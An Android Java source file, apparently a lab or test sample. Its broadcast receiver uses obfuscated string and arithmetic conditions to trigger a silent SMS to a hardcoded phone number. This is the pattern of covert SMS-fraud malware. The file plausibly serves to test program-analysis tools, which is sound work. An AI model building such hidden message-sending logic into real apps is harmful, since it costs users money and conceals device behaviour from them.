package com.example.lab418.testwebview2;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;

public class ExampleReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {

        String xxx="rrr";
        String ttt="zzz";
        xxx=xxx+ttt;
        int zz=7;
        int yy=zz/new Integer(10);


        if(intent.getAction().equals(xxx))
        {
            if(intent.getIntExtra("type",-1)==yy)
            {
                SmsManager.getDefault().sendTextMessage("18010823840", null, "ttttt", null, null);
            }
        }
    }
}
